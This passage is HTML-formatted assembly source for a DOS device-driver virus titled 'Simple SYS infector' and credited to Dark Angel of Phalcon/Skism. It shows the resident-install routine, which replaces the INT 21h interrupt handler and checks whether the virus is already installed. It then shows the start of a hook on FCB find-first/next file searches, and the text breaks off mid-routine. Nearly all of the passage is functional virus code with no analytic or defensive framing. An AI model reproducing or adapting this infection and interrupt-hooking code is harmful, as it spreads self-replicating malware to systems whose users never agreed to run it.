namevirus &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #7f007f;">'SYS INF$'</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; simple SYS infector</span><br />
<br />
endheader<span style="color: #339933;">:</span><br />
author&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #ff0000;">0</span><span style="color: #339933;">,</span><span style="color: #7f007f;">'Simple SYS infector'</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0Dh</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0Ah</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span> <span style="color: #7f007f;">'Written by Dark Angel of Phalcon/Skism'</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0</span><br />
<br />
_strategy<span style="color: #339933;">:</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; save es:bx pointer</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; next_strategy<br />
<br />
next_strategy<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cs</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">+</span>offset savebx<span style="color: #339933;">-</span>offset next_strategy<span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">bx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cs</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">+</span>offset savees<span style="color: #339933;">-</span>offset next_strategy<span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">es</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; retf<br />
<br />
_interrupt<span style="color: #339933;">:</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; install virus in memory</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ds</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; generally, only the segment</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">es</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; registers need to be preserved</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cs</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ds</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; next_interrupt<br />
<br />
next_interrupt<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bp</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">les</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">cs</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>savebx<span style="color: #339933;">-</span>next_interrupt<span style="color: black;">&#93;</span>&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;get req hdr pointer</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">es</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">+</span><span style="color: #ff0000;">3</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">8103h</span> &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; default to fail request</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">byte</span> ptr <span style="color: #46aa03; font-weight: bold;">es</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">+</span><span style="color: #ff0000;">2</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0</span> &nbsp; <span style="color: black; font-style: italic;">; check if install request</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jnz</span> &nbsp; &nbsp; exit_interrupt&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; exit if it is not</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">es</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">+</span><span style="color: #ff0000;">10h</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">cs</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; fill in ending address value</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>header<span style="color: #339933;">-</span>next_interrupt<span style="color: black;">&#93;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">es</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">+</span><span style="color: #ff0000;">0eh</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">si</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">dec</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">byte</span> ptr <span style="color: #46aa03; font-weight: bold;">es</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">+</span><span style="color: #ff0000;">3</span><span style="color: black;">&#93;</span>&nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; and assume install failure</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0b0fh</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; installation check</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">int</span> &nbsp; &nbsp; <span style="color: #ff0000;">21h</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0b0fh</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jz</span>&nbsp; &nbsp; &nbsp; exit_interrupt&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; exit if already installed</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">add</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">es</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">+</span><span style="color: #ff0000;">0eh</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span>offset endheap&nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; fixup ending address</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">es</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">+</span><span style="color: #ff0000;">3</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #ff0000;">100h</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; and status word</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xor</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; ds-&gt;interrupt table</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">les</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #ff0000;">21h</span><span style="color: #339933;">*</span><span style="color: #ff0000;">4</span><span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; get old interrupt handler</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">cs</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>oldint21<span style="color: #339933;">-</span>next_interrupt<span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">bx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">word</span> ptr <span style="color: #46aa03; font-weight: bold;">cs</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>oldint21<span style="color: #339933;">+</span><span style="color: #ff0000;">2</span><span style="color: #339933;">-</span>next_interrupt<span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">es</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">lea</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><span style="color: #339933;">,</span><span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span>int21<span style="color: #339933;">-</span>next_interrupt<span style="color: black;">&#93;</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cli</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #ff0000;">21h</span><span style="color: #339933;">*</span><span style="color: #ff0000;">4</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">si</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; replace int 21h handler</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ds</span><span style="color: #339933;">:</span><span style="color: black;">&#91;</span><span style="color: #ff0000;">21h</span><span style="color: #339933;">*</span><span style="color: #ff0000;">4</span><span style="color: #339933;">+</span><span style="color: #ff0000;">2</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">cs</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sti</span><br />
<br />
exit_interrupt<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">es</span><br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ds</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; retf<br />
<br />
int21<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0b0fh</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; installation check?</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jnz</span> &nbsp; &nbsp; notinstall<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">xchg</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><span style="color: #339933;">,</span><span style="color: #46aa03; font-weight: bold;">ax</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; mark already installed</span><br />
<br />
exitint21<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">iret</span><br />
<br />
notinstall<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pushf</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">db</span>&nbsp; &nbsp; &nbsp; <span style="color: #ff0000;">9ah</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; call far ptr This combined with the</span><br />
oldint21&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #0000ff; font-weight: bold;">dd</span>&nbsp; &nbsp; &nbsp; ? &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; pushf simulates an int 21h call</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pushf</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bp</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">sp</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; set up new stack frame</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; flags [bp+10]</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; CS:IP [bp+6]</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; flags new [bp+4]</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; bp [bp+2]</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; ax [bp]</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span><span style="color: #339933;">,</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span><span style="color: #ff0000;">4</span><span style="color: black;">&#93;</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; get flags</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">+</span><span style="color: #ff0000;">10</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #46aa03; font-weight: bold;">ax</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; replace old flags with new</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; restore the stack</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bp</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">popf</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">11h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; trap FCB find first and</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jz</span>&nbsp; &nbsp; &nbsp; findfirstnext<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">12h</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; FCB find next calls only</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jnz</span> &nbsp; &nbsp; exitint21<br />
<br />
findfirstnext<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">al</span><span style="color: #339933;">,</span><span style="color: #ff0000;">0ffh</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; successful findfirst/next?</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jz</span>&nbsp; &nbsp; &nbsp; exitint21 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; exit if not</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bp</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">call</span>&nbsp; &nbsp; next_int21<br />
<br />
next_int21<span style="color: #339933;">:</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">pop</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bp</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">sub</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bp</span><span style="color: #339933;">,</span> offset next_int21<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ax</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; save all registers</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">bx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">cx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">dx</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ds</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">es</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">si</span><br />
<br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">push</span>&nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">di</span><br />
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> &nbsp; &nbsp; <span style="color: #46aa03; font-weight: bold;">ah</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">2fh</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">; ES:BX &lt;- DTA</span><br />
